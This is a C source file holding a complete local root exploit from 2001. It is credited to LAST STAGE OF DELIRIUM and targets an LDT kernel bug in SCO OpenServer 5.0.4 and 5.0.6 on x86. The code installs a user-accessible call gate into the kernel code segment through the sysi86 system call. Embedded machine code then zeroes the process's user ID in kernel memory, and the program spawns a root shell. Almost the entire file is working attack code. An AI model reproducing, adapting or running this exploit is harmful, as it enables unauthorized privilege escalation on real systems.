/*## copyright LAST STAGE OF DELIRIUM apr 2001 poland        *://lsd-pl.net/ #*/
/*## ldt kernel bug                                                          #*/

/*   the code installs trap call gate descriptor with DPL=3 targeting kernel  */
/*   code segment selector KCSSEL (DPL=0) in task local descriptor table LDT  */
/*   through sysi86(SI86DSCR,struct ssd*) system call.                        */

/*   as a result command shell is spawned with effective root user privilege. */

#include <sys/types.h>
#include <sys/sysi86.h>
#include <sys/seg.h>
#include <sys/user.h>
#include <sys/immu.h>

#define ofs(s,m) (unsigned int)(&(((s*)0)->m))
#define ofsuid() (ofs(user_t,u_uid))
#define adr(a)   (char)(a),(char)(a>>8),(char)(a>>16),(char)(a>>24)

char asmcode[]={
    0x9a,0,0,0,0,0x44,0,       /* lcall   $0x44,$0x00000000      */
    0xc3,                      /* ret                            */

    0x33,0xc0,                 /* xorl    %eax,%eax              */
    0xa3,adr(UVUBLK+ofsuid()), /* movl    %eax,($adr)            */
    0xcb                       /* lret                           */
};

main(int argc,char **argv){
    unsigned int adr;
    struct ssd s;

    printf("copyright LAST STAGE OF DELIRIUM apr 2001 poland  //lsd-pl.net/\n");
    printf("ldt kernel bug for sco openserver 5.0.4 5.0.6 x86\n\n");

    adr=(unsigned int)&asmcode[8];
    printf("u.u_uid=0x%08x adr=0x%08x\n",UVUBLK+ofsuid(),adr);

    s.bo=(adr&0xff000000)|KCSSEL;
    s.sel=0x44;
    s.ls=adr&0x000fffff;
    s.acc1=GATE_UACC|GATE_386CALL;
    s.acc2=(adr>>20)&0xf;

    sysi86(SI86DSCR,&s);
    ((void(*)())asmcode)();

    execl("/bin/sh","lsd",0);
}

